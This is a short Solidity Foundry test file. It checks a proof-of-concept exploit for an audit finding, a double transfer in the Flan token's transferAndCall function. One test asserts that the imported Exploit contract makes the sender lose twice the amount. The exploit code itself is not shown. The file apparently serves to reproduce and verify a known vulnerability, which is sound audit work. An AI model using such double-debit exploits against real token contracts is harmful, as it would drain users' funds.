// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./42454-h-03-double-transfer-in-the-transferandcall-function-of-erc6.sol";

contract BehodlerDoubleTransferTest is Test {
    function test_exploit_transferAndCallDebitsTwice() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.stolenExtra(), e.AMOUNT(), "extra AMOUNT taken");
        assertEq(e.receiverAfter(), e.AMOUNT() * 2, "receiver got 2x");
        assertEq(e.senderAfter(), 1000 ether - e.AMOUNT() * 2, "sender lost 2x");
    }

    function test_control_singleTransferMovesOnce() public {
        Flan flan = new Flan();
        Receiver r = new Receiver();
        uint256 before = flan.balanceOf(address(this));
        flan.transfer(address(r), 100 ether);
        assertEq(flan.balanceOf(address(this)), before - 100 ether);
        assertEq(flan.balanceOf(address(r)), 100 ether);
    }
}
